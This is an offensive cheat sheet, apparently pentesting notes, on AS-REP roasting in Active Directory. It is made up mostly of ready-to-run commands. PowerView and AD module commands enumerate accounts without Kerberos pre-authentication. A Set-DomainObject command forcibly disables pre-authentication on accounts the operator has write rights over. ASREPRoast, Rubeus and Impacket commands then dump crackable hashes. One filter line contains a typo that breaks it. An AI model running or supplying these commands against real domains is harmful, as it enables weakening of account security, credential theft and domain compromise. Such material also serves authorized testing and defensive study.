**WHAT IS THIS?**

If a domain user account does not require Kerberos pre-authentication, we can request a valid TGT (Ticket Granting Ticket) for this account without even having domain credentials, extract the encrypted blob and bruteforce it offline.

**Requirements:** Accounts with the attribute **`DONT_REQ_PREAUTH`**:
- PowerView:
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
- AD Module:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

---

# PowerView
- Forcefully disable Kerberos Pre-Auth on an account if I have Write Permissions or more! Check for interesting permissions on accounts (we add a filter e.g. `RDPUsers` to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!):
```powershell
# Check for interesting permissions on accounts
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

# Disable Kerberos Pre-Auth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose

# Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```
- And finally execute the attack using the [**ASREPRoast**](https://github.com/HarmJ0y/ASREPRoast) tool (deprecated in favor of **Rubeus**):
```powershell
# Get a specific account's hash:
Get-ASREPHash -UserName <UserName> -Verbose

# Get any AS-REP Roastable users' hashes:
Invoke-ASREPRoast -Verbose
```

---

# Rubeus
- Try the attack for all domain users:
```powershell
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```

- AS-REP Roast specific user:
```powershell
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```

- AS-REP Roast users of a specific OU (Organization Unit):
```powershell
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```

---

# Impacket
- Try the attack for the specified users in the file:
```shell
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
```
- Alternatively:
```shell
sudo impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <FileName <DomainName>/<DomainUser>
```